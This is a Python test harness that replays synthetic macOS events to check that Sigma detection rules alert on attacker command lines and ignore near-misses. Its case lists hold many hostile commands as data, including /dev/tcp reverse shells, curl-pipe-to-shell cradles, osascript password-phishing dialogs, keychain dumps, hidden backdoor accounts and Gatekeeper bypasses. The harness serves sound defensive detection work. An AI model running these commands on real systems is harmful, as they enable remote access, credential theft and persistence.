"""Check macOS rule logic with the real engine: positives and near-miss negatives.

Replays hand-written Endpoint Security style events, so it needs no sensor and no
entitlement. Each case names the rule that must (or must not) alert for one
event. The engine reports a single alert per event, so rules that overlap on an
event would mask one another; each rule is therefore replayed alone against its
own cases.
"""

import argparse
import hashlib
import json
import shutil
import subprocess
import tempfile
from pathlib import Path

GK_GLOBAL = "Gatekeeper Globally Disabled via spctl"
XATTR = "Quarantine Attribute Removed via xattr"
OSA_PHISH = "osascript Hidden-Answer Password Prompt"
OSA_ADMIN = "osascript Privileged Shell Command with Staging Indicators"
DEV_TCP = "macOS Reverse Shell via /dev/tcp"
ACCOUNT = "Local Account Created via Directory Services"
ADMIN_GROUP = "Account Added to the macOS Admin Group"
HIDDEN = "Local Account Hidden from the Login Window"
LAUNCHCTL = "launchctl Load from User-Writable Path"
CRADLE = "Shell Download-and-Execute Pipe Cradle"
EXEC = "Unsigned or Ad-Hoc Signed Binary Executed from a Staging Directory"
KEYCHAIN = "Keychain Credential Dump via security"
PLIST = "Launch Agent or Daemon Plist Written"
PLIST_SCRIPTED = "Launch Agent or Daemon Plist Written by a Shell or Scripting Process"
KEYS = "SSH authorized_keys Written (macOS)"
AUTHONLY = "Password Validation via dscl -authonly"
AUTH_PLUGIN = "Authorization Plugin Written to SecurityAgentPlugins"
PROFILE = "Shell Profile Modified by a Shell or Scripting Process"
LOGIN_HOOK = "Login Hook or Login Item Added from the Command Line"
TRUSTED_CERT = "Root Certificate Added to the Trust Store via security"
MINER = "Cryptominer Command Line (macOS)"
STEALER = "sudo Password from Stdin or JXA Objective-C Import"
SCHEDULED_JOB = "Cron or At Job Submission (macOS)"
CONFIG_PROFILE = "Configuration Profile Installation Attempt (macOS)"
DYLD_INSERT = "DYLD_INSERT_LIBRARIES Set to a User-Writable Path (macOS)"
SCREEN_CAPTURE = "Silent or Scripted Screen Capture Attempt via screencapture (macOS)"
CLIPBOARD = "Scripted Clipboard Read via pbpaste or osascript (macOS)"

RULE_FILES = {
    GK_GLOBAL: "proc_creation_macos_gatekeeper_bypass.yml",
    XATTR: "proc_creation_macos_quarantine_attribute_removed.yml",
    OSA_PHISH: "proc_creation_macos_osascript_admin_prompt.yml",
    OSA_ADMIN: "proc_creation_macos_osascript_admin_shell.yml",
    DEV_TCP: "proc_creation_macos_shell_dev_tcp_reverse_shell.yml",
    ACCOUNT: "proc_creation_macos_local_admin_account.yml",
    ADMIN_GROUP: "proc_creation_macos_admin_group_membership.yml",
    HIDDEN: "proc_creation_macos_hidden_user_account.yml",
    LAUNCHCTL: "proc_creation_macos_launchctl_susp_load.yml",
    CRADLE: "proc_creation_macos_download_execute_cradle.yml",
    EXEC: "proc_creation_macos_exec_from_world_writable.yml",
    KEYCHAIN: "proc_creation_macos_keychain_dump_security.yml",
    PLIST: "file_event_macos_launch_persistence.yml",
    PLIST_SCRIPTED: "file_event_macos_launch_persistence_scripted.yml",
    KEYS: "file_event_macos_ssh_authorized_keys.yml",
    AUTHONLY: "proc_creation_macos_dscl_authonly.yml",
    AUTH_PLUGIN: "file_event_macos_authorization_plugin.yml",
    PROFILE: "file_event_macos_shell_profile_scripted.yml",
    LOGIN_HOOK: "proc_creation_macos_login_hook_or_item.yml",
    TRUSTED_CERT: "proc_creation_macos_trusted_cert_added.yml",
    MINER: "proc_creation_macos_cryptominer_cmdline.yml",
    STEALER: "proc_creation_macos_stealer_execution.yml",
    SCHEDULED_JOB: "proc_creation_macos_scheduled_job.yml",
    CONFIG_PROFILE: "proc_creation_macos_configuration_profile_install.yml",
    DYLD_INSERT: "proc_creation_macos_dyld_insert_libraries.yml",
    SCREEN_CAPTURE: "proc_creation_macos_screen_capture.yml",
    CLIPBOARD: "proc_creation_macos_scripted_clipboard_read.yml",
}

SCREEN_IMAGE = "/usr/sbin/screencapture"
PBPASTE_IMAGE = "/usr/bin/pbpaste"
OSASCRIPT_IMAGE = "/usr/bin/osascript"
LOGIN_SHELL = {"ParentImage": "/bin/zsh", "ParentCommandLine": "-zsh"}
SHELL_SCRIPT = {"ParentImage": "/bin/bash", "ParentCommandLine": "/bin/bash /opt/ops/task.sh"}
PYTHON_SCRIPT = {
    "ParentImage": "/usr/local/bin/python3.12",
    "ParentCommandLine": "/usr/local/bin/python3.12 /opt/ops/task.py",
}

# (rule, Image, CommandLine, extra fields, alerts)
PROCESS_CASES = [
    (MINER, "/usr/bin/true", "true stratum+tcp://pool.invalid:3333", {}, True),
    (MINER, "/usr/bin/true", "true --url=stratum+ssl://pool.invalid:443", {}, True),
    (MINER, "/usr/bin/true", "true stratum+tls://pool.invalid:443", {}, True),
    (MINER, "/usr/bin/true", "true --donate-level 1", {}, True),
    (MINER, "/usr/bin/true", "true --coin=monero", {}, True),
    (MINER, "/usr/bin/true", "true --coinbase value", {}, False),
    (STEALER, "/usr/bin/sudo", "sudo -S --version", {}, True),
    (STEALER, "/usr/bin/sudo", "sudo -u root -Sk /usr/bin/true", {}, True),
    (STEALER, "/usr/bin/sudo", "sudo --user=root --stdin /usr/bin/true", {}, True),
    (STEALER, "/usr/bin/sudo", "sudo --user root -S /usr/bin/true", {}, True),
    (STEALER, "/usr/bin/sudo", "sudo -s", {}, False),
    (STEALER, "/usr/bin/sudo", "sudo /usr/bin/ssh -S /tmp/ssh.sock example.test", {}, False),
    (
        STEALER,
        "/usr/bin/osascript",
        'osascript -l JavaScript -e ObjC.import("Foundation"); 1',
        {},
        True,
    ),
    (
        STEALER,
        "/usr/bin/osascript",
        'osascript -lJavaScript -e ObjC.import ("Foundation")',
        {},
        True,
    ),
    (STEALER, "/usr/bin/osascript", "osascript -l JavaScript /tmp/script.js", {}, False),
    (SCHEDULED_JOB, "/usr/bin/crontab", "crontab -", {}, True),
    (SCHEDULED_JOB, "/usr/bin/crontab", "crontab -u alice ./backup.cron", {}, True),
    (
        SCHEDULED_JOB,
        "/usr/bin/crontab",
        "crontab -e",
        {"ParentImage": "/bin/bash", "ParentCommandLine": "/bin/bash /opt/admin/update.sh"},
        True,
    ),
    (
        SCHEDULED_JOB,
        "/usr/bin/crontab",
        "crontab -e",
        {"ParentImage": "/bin/zsh", "ParentCommandLine": "-zsh"},
        False,
    ),
    (SCHEDULED_JOB, "/usr/bin/crontab", "crontab -u alice -r", {}, False),
    (SCHEDULED_JOB, "/usr/bin/at", "at now + 1 hour", {}, True),
    (SCHEDULED_JOB, "/usr/bin/at", "at -q a -f /tmp/job.txt 17:30", {}, True),
    (SCHEDULED_JOB, "/usr/bin/at", "at -t 203001011200", {}, True),
    (SCHEDULED_JOB, "/usr/bin/at", "at -c 172", {}, False),
    (
        CONFIG_PROFILE,
        "/usr/bin/profiles",
        "profiles install -path /tmp/missing.mobileconfig",
        {},
        True,
    ),
    (CONFIG_PROFILE, "/usr/bin/profiles", "profiles -I -F /tmp/a.mobileconfig", {}, True),
    (CONFIG_PROFILE, "/usr/bin/profiles", "profiles -F /tmp/a.mobileconfig", {}, True),
    (CONFIG_PROFILE, "/usr/bin/profiles", "profiles -R -F /tmp/a.mobileconfig", {}, False),
    (CONFIG_PROFILE, "/usr/bin/open", "open /tmp/a.mobileconfig", {}, True),
    (CONFIG_PROFILE, "/usr/bin/open", "open /private/tmp/a.mobileconfig", {}, True),
    (CONFIG_PROFILE, "/usr/bin/open", "open /Users/Shared/a.mobileconfig", {}, True),
    (
        CONFIG_PROFILE,
        "/usr/bin/open",
        "open /Users/alice/Downloads/Company VPN.MOBILECONFIG",
        {},
        True,
    ),
    (CONFIG_PROFILE, "/usr/bin/open", "open /Users/alice/Documents/a.mobileconfig", {}, False),
    (CONFIG_PROFILE, "/usr/bin/open", "open /tmp/a.mobileconfig.zip", {}, False),
    (
        DYLD_INSERT,
        "/usr/bin/env",
        "env DYLD_INSERT_LIBRARIES=/private/tmp/missing.dylib",
        {},
        True,
    ),
    (
        DYLD_INSERT,
        "/bin/zsh",
        "zsh -c 'DYLD_INSERT_LIBRARIES=\"/Users/alice/Build Output/hook.dylib\" /usr/bin/true'",
        {},
        True,
    ),
    (
        DYLD_INSERT,
        "/bin/launchctl",
        "launchctl setenv DYLD_INSERT_LIBRARIES /usr/lib/first.dylib:/Users/Shared/second.dylib",
        {},
        True,
    ),
    (
        DYLD_INSERT,
        "/bin/launchctl",
        "launchctl setenv DYLD_INSERT_LIBRARIES /usr/lib/libSystem.B.dylib",
        {},
        False,
    ),
    (
        DYLD_INSERT,
        "/usr/bin/env",
        "env BACKUP_DYLD_INSERT_LIBRARIES=/tmp/missing.dylib",
        {},
        False,
    ),
    (AUTHONLY, "/usr/bin/dscl", "dscl . -authonly alice hunter2", {}, True),
    (AUTHONLY, "/usr/bin/dscl", "dscl /Local/Default -authonly alice pw", {}, True),
    (AUTHONLY, "/usr/bin/dscl", "dscl . -read /Users/alice", {}, False),
    (AUTHONLY, "/usr/bin/dscl", "dscl . -list /Users", {}, False),
    (
        LOGIN_HOOK,
        "/usr/bin/defaults",
        "defaults write com.apple.loginwindow LoginHook /tmp/x.sh",
        {},
        True,
    ),
    (
        LOGIN_HOOK,
        "/usr/bin/defaults",
        "defaults write com.apple.loginwindow LogoutHook /tmp/x.sh",
        {},
        True,
    ),
    (
        LOGIN_HOOK,
        "/usr/bin/osascript",
        'osascript -e \'tell application "System Events" to make login item at end with properties {path:"/tmp/x.app"}\'',  # noqa: E501
        {},
        True,
    ),
    (LOGIN_HOOK, "/usr/bin/defaults", "defaults read com.apple.loginwindow", {}, False),
    (
        LOGIN_HOOK,
        "/usr/bin/defaults",
        "defaults write com.apple.loginwindow GuestEnabled -bool false",
        {},
        False,
    ),
    (
        LOGIN_HOOK,
        "/usr/bin/osascript",
        "osascript -e 'tell application \"System Events\" to get the name of every login item'",
        {},
        False,
    ),
    (
        TRUSTED_CERT,
        "/usr/bin/security",
        "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/ca.pem",  # noqa: E501
        {},
        True,
    ),
    (TRUSTED_CERT, "/usr/bin/security", "security list-keychains", {}, False),
    (TRUSTED_CERT, "/usr/bin/security", "security verify-cert -c /tmp/ca.pem", {}, False),
    # Gatekeeper: the global switch only; xattr is a separate rule.
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --master-disable", {}, True),
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --global-disable", {}, True),
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --status", {}, False),
    (GK_GLOBAL, "/usr/sbin/spctl", "spctl --master-enable", {}, False),
    (GK_GLOBAL, "/usr/bin/xattr", "xattr -d com.apple.quarantine /tmp/app", {}, False),
    # Quarantine removal: by name or clear-all, minus managed launchers.
    (XATTR, "/usr/bin/xattr", "xattr -d com.apple.quarantine /Applications/App.app", {}, True),
    (XATTR, "/usr/bin/xattr", "xattr -dr com.apple.quarantine /Applications/App.app", {}, True),
    (XATTR, "/usr/bin/xattr", "xattr -cr /Applications/App.app", {}, True),
    (XATTR, "/usr/bin/xattr", "xattr -c /tmp/installer", {}, True),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -d com.apple.quarantine /Applications/App.app",
        {"ParentImage": "/bin/zsh"},
        True,
    ),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -d com.apple.quarantine /Applications/App.app",
        {"ParentImage": "/opt/homebrew/Library/Homebrew/vendor/portable-ruby/3.4.5/bin/ruby"},
        False,
    ),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -cr /Applications/App.app",
        {"ParentImage": "/usr/local/Homebrew/Library/Homebrew/vendor/portable-ruby/3.4.5/bin/ruby"},
        False,
    ),
    # A Homebrew-installed shell is not Homebrew itself: the filter must not hide it.
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -d com.apple.quarantine /Applications/App.app",
        {"ParentImage": "/opt/homebrew/Cellar/bash/5.3.15/bin/bash"},
        True,
    ),
    (
        XATTR,
        "/usr/bin/xattr",
        "xattr -cr /Applications/App.app",
        {"ParentImage": "/usr/local/jamf/bin/jamf"},
        False,
    ),
    (XATTR, "/usr/bin/xattr", "xattr -l /Applications/App.app", {}, False),
    (XATTR, "/usr/bin/xattr", "xattr -p com.apple.quarantine /tmp/app", {}, False),
    (XATTR, "/usr/bin/xattr", "xattr -w com.apple.quarantine 0083 /tmp/app", {}, False),
    # osascript: credential prompt and privileged staging are separate.
    (
        OSA_PHISH,
        "/usr/bin/osascript",
        'osascript -e \'display dialog "Update" default answer "" with hidden answer\'',
        {},
        True,
    ),
    (OSA_PHISH, "/usr/bin/osascript", "osascript -e 'display dialog \"Done\"'", {}, False),
    (
        OSA_PHISH,
        "/usr/bin/osascript",
        "osascript -e 'do shell script \"curl http://x/a\" with administrator privileges'",
        {},
        False,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        'osascript -e \'do shell script "curl -o /tmp/a http://x/a && chmod +x /tmp/a" '
        "with administrator privileges'",
        {},
        True,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        "osascript -e 'do shell script \"python3 setup.py\" with administrator privileges'",
        {},
        False,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        "osascript -e 'do shell script \"curl http://x/a\"'",
        {},
        False,
    ),
    (
        OSA_ADMIN,
        "/usr/bin/osascript",
        'osascript -e \'display dialog "x" default answer "" with hidden answer\'',
        {},
        False,
    ),
    # /dev/tcp: bash (including Apple's /bin/bash and /bin/sh) and ksh have it; zsh never.
    (DEV_TCP, "/opt/homebrew/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/tmp/x/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/bin/ksh", "ksh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", {}, True),
    (DEV_TCP, "/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/bin/sh", "sh -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
    (DEV_TCP, "/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", {}, False),
    (DEV_TCP, "/bin/zsh", "zsh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", {}, False),
    (DEV_TCP, "/opt/homebrew/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", {}, False),
    # Accounts: creation, admin-group membership and hiding are separate.
    (ACCOUNT, "/usr/bin/dscl", "dscl . -create /Users/backdoor", {}, True),
    (ACCOUNT, "/usr/sbin/sysadminctl", "sysadminctl -addUser backdoor -password x", {}, True),
    (ACCOUNT, "/usr/bin/dscl", "dscl . -append /Groups/admin GroupMembership backdoor", {}, False),
    (ACCOUNT, "/usr/bin/dscl", "dscl . -read /Users/alice", {}, False),
    (ACCOUNT, "/usr/sbin/dseditgroup", "dseditgroup -o edit -a alice -t user admin", {}, False),
    (
        ADMIN_GROUP,
        "/usr/sbin/dseditgroup",
        "dseditgroup -o edit -a backdoor -t user admin",
        {},
        True,
    ),
    (
        ADMIN_GROUP,
        "/usr/bin/dscl",
        "dscl . -append /Groups/admin GroupMembership backdoor",
        {},
        True,
    ),
    (
        ADMIN_GROUP,
        "/usr/sbin/sysadminctl",
        "sysadminctl -addUser backdoor -password x -admin",
        {},
        True,
    ),
    (
        ADMIN_GROUP,
        "/usr/sbin/sysadminctl",
        "sysadminctl -admin -addUser backdoor -password x",
        {},
        True,
    ),
    (ADMIN_GROUP, "/usr/sbin/sysadminctl", "sysadminctl -addUser guest -password x", {}, False),
    (
        ADMIN_GROUP,
        "/usr/sbin/sysadminctl",
        "sysadminctl -adminUser root -adminPassword x -addUser guest",
        {},
        False,
    ),
    (
        ADMIN_GROUP,
        "/usr/sbin/dseditgroup",
        "dseditgroup -o edit -a alice -t user staff",
        {},
        False,
    ),
    (ADMIN_GROUP, "/usr/sbin/dseditgroup", "dseditgroup -o read admin", {}, False),
    (ADMIN_GROUP, "/usr/bin/dscl", "dscl . -read /Groups/admin GroupMembership", {}, False),
    (HIDDEN, "/usr/bin/dscl", "dscl . -create /Users/backdoor IsHidden 1", {}, True),
    (
        HIDDEN,
        "/usr/bin/defaults",
        "defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool YES",
        {},
        True,
    ),
    (HIDDEN, "/usr/bin/dscl", "dscl . -create /Users/alice IsHidden 0", {}, False),
    (HIDDEN, "/usr/bin/dscl", "dscl . -create /Users/alice UserShell /bin/zsh", {}, False),
    (
        HIDDEN,
        "/usr/bin/defaults",
        "defaults read /Library/Preferences/com.apple.loginwindow Hide500Users",
        {},
        False,
    ),
    # launchctl: load/bootstrap as subcommands of a staged plist.
    (LAUNCHCTL, "/bin/launchctl", "launchctl load /tmp/evil.plist", {}, True),
    (LAUNCHCTL, "/bin/launchctl", "launchctl load -w /private/tmp/a/evil.plist", {}, True),
    (LAUNCHCTL, "/bin/launchctl", "launchctl bootstrap gui/501 /Users/Shared/evil.plist", {}, True),
    (LAUNCHCTL, "/bin/launchctl", "launchctl unload /tmp/evil.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl bootout gui/501 /tmp/evil.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl load /Library/LaunchDaemons/a.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl load /Users/dev/tmp/a.plist", {}, False),
    (LAUNCHCTL, "/bin/launchctl", "launchctl list /tmp/download.plist", {}, False),
    # Cradle: the pipe target is a shell word, not a prefix of shasum.
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a | bash'", {}, True),
    (CRADLE, "/bin/zsh", "zsh -c 'curl -fsSL http://x/a | sh'", {}, True),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a |sudo bash'", {}, True),
    (CRADLE, "/bin/bash", "bash -c 'wget -qO- http://x/a | /bin/sh -s'", {}, True),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a | shasum -a 256'", {}, False),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a | sha256sum'", {}, False),
    (CRADLE, "/bin/bash", "bash -c 'curl -s http://x/a -o /tmp/a'", {}, False),
    # Keychain: 'arc' inside another word is not a browser name.
    (
        KEYCHAIN,
        "/usr/bin/security",
        "security find-generic-password -s Chrome -w",
        {},
        True,
    ),
    (KEYCHAIN, "/usr/bin/security", "security dump-keychain -d login.keychain", {}, True),
    (
        KEYCHAIN,
        "/usr/bin/security",
        "security find-generic-password -s search-service -w",
        {},
        False,
    ),
    # Screen capture: silent options and script attribution are independent signals.
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture -x /tmp/test.png", {}, True),
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture -D 1 -mx /tmp/test.png", LOGIN_SHELL, True),
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture /tmp/test.png", SHELL_SCRIPT, True),
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture /tmp/test.png", PYTHON_SCRIPT, True),
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture -i /tmp/test.png", LOGIN_SHELL, False),
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture /tmp/notes-x.png", {}, False),
    (SCREEN_CAPTURE, SCREEN_IMAGE, "screencapture -- -x", {}, False),
    (
        SCREEN_CAPTURE,
        SCREEN_IMAGE,
        "screencapture /tmp/test.png",
        {"ParentImage": "/bin/zsh", "IsPlatformBinary": True},
        False,
    ),
    (SCREEN_CAPTURE, "/tmp/screencapture", "screencapture -x /tmp/test.png", SHELL_SCRIPT, False),
    # Clipboard: both tools need evidence of scripting, and AppleScript must read.
    (CLIPBOARD, PBPASTE_IMAGE, "pbpaste", SHELL_SCRIPT, True),
    (CLIPBOARD, PBPASTE_IMAGE, "pbpaste -Prefer txt", PYTHON_SCRIPT, True),
    (
        CLIPBOARD,
        PBPASTE_IMAGE,
        "pbpaste",
        {"ParentImage": "/bin/sh", "ParentCommandLine": "/bin/sh -lc pbpaste"},
        True,
    ),
    (CLIPBOARD, OSASCRIPT_IMAGE, "osascript -e the clipboard", SHELL_SCRIPT, True),
    (CLIPBOARD, OSASCRIPT_IMAGE, "osascript -e get the clipboard as text", SHELL_SCRIPT, True),
    (CLIPBOARD, OSASCRIPT_IMAGE, "osascript -e return (the clipboard)", SHELL_SCRIPT, True),
    (
        CLIPBOARD,
        OSASCRIPT_IMAGE,
        "osascript -l AppleScript -e set clipText to THE CLIPBOARD -e return clipText",
        PYTHON_SCRIPT,
        True,
    ),
    (CLIPBOARD, PBPASTE_IMAGE, "pbpaste", LOGIN_SHELL, False),
    (CLIPBOARD, PBPASTE_IMAGE, "pbpaste", {"ParentImage": "/bin/bash"}, False),
    (CLIPBOARD, PBPASTE_IMAGE, "pbpaste", {"ParentCommandLine": "/usr/bin/python3 -i"}, False),
    (CLIPBOARD, "/tmp/pbpaste", "pbpaste", SHELL_SCRIPT, False),
    (CLIPBOARD, "/usr/bin/pbcopy", "pbcopy", SHELL_SCRIPT, False),
    (CLIPBOARD, OSASCRIPT_IMAGE, "osascript -e return the clipboard", LOGIN_SHELL, False),
    (CLIPBOARD, OSASCRIPT_IMAGE, "osascript -e clipboard info", SHELL_SCRIPT, False),
    (CLIPBOARD, OSASCRIPT_IMAGE, 'osascript -e set the clipboard to "hello"', SHELL_SCRIPT, False),
    (
        CLIPBOARD,
        OSASCRIPT_IMAGE,
        'osascript -e display dialog "the clipboard"',
        SHELL_SCRIPT,
        False,
    ),
    (CLIPBOARD, OSASCRIPT_IMAGE, 'osascript -e return "the clipboard"', SHELL_SCRIPT, False),
    (CLIPBOARD, OSASCRIPT_IMAGE, 'osascript -e "the clipboard"', SHELL_SCRIPT, False),
    (CLIPBOARD, OSASCRIPT_IMAGE, "osascript -l JavaScript -e the clipboard", SHELL_SCRIPT, False),
    # Staging execution: platform and team-signed binaries are excluded.
    (EXEC, "/tmp/payload", "/tmp/payload", {"IsPlatformBinary": False}, True),
    (EXEC, "/private/tmp/a/payload", "payload", {"IsPlatformBinary": False, "TeamId": ""}, True),
    (EXEC, "/Users/Shared/payload", "payload", {"IsPlatformBinary": False}, True),
    (EXEC, "/Users/alice/Downloads/app/payload", "payload", {"IsPlatformBinary": False}, True),
    (EXEC, "/tmp/payload", "/tmp/payload", {"IsPlatformBinary": True}, False),
    (
        EXEC,
        "/tmp/payload",
        "/tmp/payload",
        {"IsPlatformBinary": False, "TeamId": "ABCDE12345"},
        False,
    ),
    (EXEC, "/usr/bin/true", "true", {"IsPlatformBinary": True}, False),
    (EXEC, "/Applications/App.app/Contents/MacOS/App", "App", {"IsPlatformBinary": False}, False),
]

# (rule, Image, TargetFilename, alerts)
FILE_CASES = [
    (
        AUTH_PLUGIN,
        "/bin/sh",
        "/Library/Security/SecurityAgentPlugins/Evil.bundle/Contents/MacOS/Evil",
        True,
    ),
    (AUTH_PLUGIN, "/usr/bin/dd", "/Library/Security/SecurityAgentPlugins/x.txt", True),
    (
        AUTH_PLUGIN,
        "/usr/sbin/installer",
        "/Library/Security/SecurityAgentPlugins/V.bundle/Info.plist",
        False,
    ),
    (AUTH_PLUGIN, "/usr/bin/touch", "/Library/Security/notes.txt", False),
    (PROFILE, "/bin/zsh", "/Users/alice/.zshrc", True),
    (PROFILE, "/bin/bash", "/Users/alice/.zprofile", True),
    (PROFILE, "/usr/bin/curl", "/Users/alice/.bash_profile", True),
    (PROFILE, "/usr/bin/python3", "/etc/zshrc", True),
    (PROFILE, "/usr/bin/vim", "/Users/alice/.zshrc", False),
    (PROFILE, "/bin/zsh", "/Users/alice/notes.txt", False),
    (
        PROFILE,
        "/opt/homebrew/Library/Homebrew/vendor/portable-ruby/3.4.5/bin/ruby",
        "/Users/alice/.zprofile",
        False,
    ),
    (PLIST, "/usr/bin/plutil", "/Users/alice/Library/LaunchAgents/com.evil.plist", True),
    (PLIST, "/tmp/dropper", "/Library/LaunchDaemons/com.evil.plist", True),
    (PLIST, "/usr/sbin/installer", "/Library/LaunchDaemons/com.vendor.helper.plist", False),
    (PLIST, "/System/Library/CoreServices/x/installd", "/Library/LaunchAgents/com.v.plist", False),
    (PLIST, "/usr/libexec/installd", "/Library/LaunchDaemons/com.vendor.plist", False),
    (
        PLIST,
        "/opt/homebrew/Library/Homebrew/vendor/portable-ruby/3.4.5/bin/ruby",
        "/Users/alice/Library/LaunchAgents/homebrew.mxcl.x.plist",
        False,
    ),
    (
        PLIST,
        "/opt/homebrew/Cellar/python@3.14/3.14.8/bin/python3.14",
        "/Users/alice/Library/LaunchAgents/com.evil.plist",
        True,
    ),
    (PLIST, "/usr/local/jamf/bin/jamf", "/Library/LaunchDaemons/com.jamf.plist", False),
    (PLIST, "/usr/bin/plutil", "/Library/LaunchAgents/readme.txt", False),
    (PLIST, "/usr/bin/plutil", "/System/Library/LaunchDaemons/com.apple.x.plist", False),
    (PLIST_SCRIPTED, "/bin/bash", "/Users/alice/Library/LaunchAgents/com.evil.plist", True),
    (PLIST_SCRIPTED, "/bin/sh", "/Library/LaunchDaemons/com.evil.plist", True),
    (PLIST_SCRIPTED, "/usr/bin/osascript", "/Library/LaunchAgents/com.evil.plist", True),
    (PLIST_SCRIPTED, "/usr/bin/curl", "/Library/LaunchAgents/com.evil.plist", True),
    (PLIST_SCRIPTED, "/usr/bin/plutil", "/Users/alice/Library/LaunchAgents/com.evil.plist", False),
    (PLIST_SCRIPTED, "/bin/bash", "/Users/alice/Documents/com.evil.plist", False),
    (KEYS, "/bin/sh", "/Users/alice/.ssh/authorized_keys", True),
    (KEYS, "/usr/bin/vim", "/var/root/.ssh/authorized_keys2", True),
    (KEYS, "/opt/homebrew/Cellar/bash/5.3.15/bin/bash", "/Users/alice/.ssh/authorized_keys", True),
    (KEYS, "/usr/local/jamf/bin/jamf", "/Users/alice/.ssh/authorized_keys", False),
    (KEYS, "/bin/sh", "/Users/alice/.ssh/known_hosts", False),
    (KEYS, "/bin/sh", "/Users/alice/backup/authorized_keys", False),
]


def process_event(index, image, command_line, extra):
    fields = {"ProcessId": str(index), "Image": image, "CommandLine": command_line}
    fields.update(extra)
    return {"category": "Process", "event_id": 1, "fields": fields}


def file_event(index, image, path):
    return {
        "category": "File",
        "event_id": 11,
        "fields": {"ProcessId": str(index), "Image": image, "TargetFilename": path},
    }


def replay(engine, repo, rule, cases):
    timestamp = "2026-10-08T08:00:00Z"
    events = []
    expected = set()
    for index, (alerts, build) in enumerate(cases, 1):
        event = build(index)
        event.update(
            event_time=timestamp,
            ingest_seq=index,
            platform="macos",
            provider="esf",
            opcode=1,
        )
        events.append(event)
        if alerts:
            expected.add(index)

    with tempfile.TemporaryDirectory(prefix="rustinel-macos-logic-replay-") as directory:
        root = Path(directory)
        rules = root / "sigma"
        rules.mkdir()
        source = next((repo / "rules/sigma/macos").glob(RULE_FILES[rule]))
        shutil.copyfile(source, rules / source.name)
        payload = root / "cases.ndjson"
        data = "".join(json.dumps(event) + "\n" for event in events).encode()
        payload.write_bytes(data)
        payload.with_suffix(".manifest.json").write_text(
            json.dumps(
                {
                    "schema_version": 2,
                    "payload": payload.name,
                    "rustinel_version": json.loads(
                        (repo / "compatibility/engine.json").read_text()
                    )["version"],
                    "platform": "macos",
                    "started_at": timestamp,
                    "ended_at": timestamp,
                    "status": "complete",
                    "events": {
                        "received": len(events),
                        "written": len(events),
                        "lost": 0,
                        "source_lost": 0,
                    },
                    "payload_bytes": len(data),
                    "payload_sha256": hashlib.sha256(data).hexdigest(),
                }
            )
        )
        config = root / "config.toml"
        config.write_text(
            f"[scanner]\nsigma_rules_path = {json.dumps(str(rules))}\n"
            'sigma_match_mode = "all"\nyara_enabled = false\n'
            "[ioc]\nenabled = false\n[dedup]\nenabled = false\n"
            f"[logging]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
            f"[alerts]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
        )
        output = root / "alerts.ndjson"
        subprocess.run(
            [str(engine), "replay", str(payload), "--config", str(config), "--output", str(output)],
            check=True,
            timeout=30,
            capture_output=True,
        )
        alerts = [json.loads(line) for line in output.read_text().splitlines()]
        actual = {int(alert["process.pid"]) for alert in alerts if alert["rule.name"] == rule}
        if actual != expected:
            raise RuntimeError(
                f"{rule}: missing alerts for cases {sorted(expected - actual)}; "
                f"unexpected alerts for cases {sorted(actual - expected)}"
            )
    return len(expected)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--engine", required=True, type=Path)
    args = parser.parse_args()
    engine = args.engine.resolve()
    repo = Path(__file__).resolve().parents[2]

    grouped = {rule: [] for rule in RULE_FILES}
    for rule, image, command_line, extra, alerts in PROCESS_CASES:
        grouped[rule].append(
            (alerts, lambda i, a=image, c=command_line, x=extra: process_event(i, a, c, x))
        )
    for rule, image, path, alerts in FILE_CASES:
        grouped[rule].append((alerts, lambda i, a=image, p=path: file_event(i, a, p)))

    total = positives = 0
    for rule, cases in grouped.items():
        positives += replay(engine, repo, rule, cases)
        total += len(cases)
    print(f"Passed {total} logic replay cases ({positives} expected alerts).")


if __name__ == "__main__":
    main()
